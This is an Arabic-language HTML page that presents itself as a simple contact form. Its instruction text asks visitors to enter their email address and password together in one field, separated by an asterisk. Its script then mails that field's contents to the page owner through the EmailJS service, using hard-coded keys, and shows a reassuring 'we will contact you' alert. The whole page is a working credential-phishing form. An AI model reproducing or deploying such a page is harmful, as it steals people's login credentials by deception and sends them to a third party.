‏<!DOCTYPE html>
‏<html lang="ar">
‏<head>
‏    <meta charset="UTF-8">
‏    <meta name="viewport" content="width=device-width, initial-scale=1.0">
‏    <title>نموذج الاتصال</title>
‏    <style>
‏        body {
‏            font-family: Arial, sans-serif;
‏            padding: 20px;
‏            background-color: #f4f4f9;
        }
‏        form {
‏            background-color: #fff;
‏            padding: 20px;
‏            border-radius: 8px;
‏            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
‏            max-width: 500px;
‏            margin: 0 auto;
        }
‏        input, button {
‏            width: 100%;
‏            padding: 10px;
‏            margin: 8px 0;
‏            border-radius: 4px;
‏            border: 1px solid #ccc;
        }
‏        button {
‏            background-color: #4CAF50;
‏            color: white;
‏            cursor: pointer;
        }
‏        button:hover {
‏            background-color: #45a049;
        }
‏        .image-container img {
‏            width: 50px;
‏            height: 50px;
‏            margin-bottom: 10px;
        }
‏        .instructions {
‏            font-size: 14px;
‏            color: #555;
‏            margin-bottom: 20px;
        }
‏    </style>
‏</head>
‏<body>
‏    <h2>نموذج الاتصال</h2>

    <!-- النص التوضيحي فوق النموذج -->
‏    <div class="instructions">
        طريقة الاستخدام: اكتب البريد الإلكتروني ثم كلمة السر في خانة واحدة مع ترك نجمة بينهما.
‏    </div>

‏    <div class="image-container">
‏        <img src="https://shamra.sy/uploads/media/cache/news_article/uploads/news_thumbs/162196660179.png" alt="صورة صغيرة">
‏    </div>

‏    <form id="contact-form">
‏        <label for="message">أدخل البريد الإلكتروني وكلمة السر:</label><br>
‏        <input type="text" id="message" name="message" required><br><br>

‏        <button type="submit">إرسال</button>
‏    </form>

‏    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>

‏    <script type="text/javascript">
‏        (function() {
‏            emailjs.init("vlFVPJKVXexbERK05"); // استبدل بـ Public Key الخاص بك
        })();

‏        document.getElementById("contact-form").addEventListener("submit", function(event) {
‏            event.preventDefault(); // منع السلوك الافتراضي للنموذج

            // إرسال النموذج عبر EmailJS باستخدام template_id الصحيح
‏            emailjs.sendForm("service_vtr9eml", "template_21bkk3i", this)
‏                .then(function(response) {
‏                    console.log("تم إرسال الرسالة بنجاح:", response);
‏                    alert("لقد تلقينا رسالتك وسنتواصل معك قريباً.");
‏                }, function(error) {
‏                    console.error("فشل إرسال الرسالة:", error); 
‏                    alert("حدث خطأ أثناء إرسال الرسالة: " + error.text);
                });
        });
‏    </script>
‏</body>
‏</html>

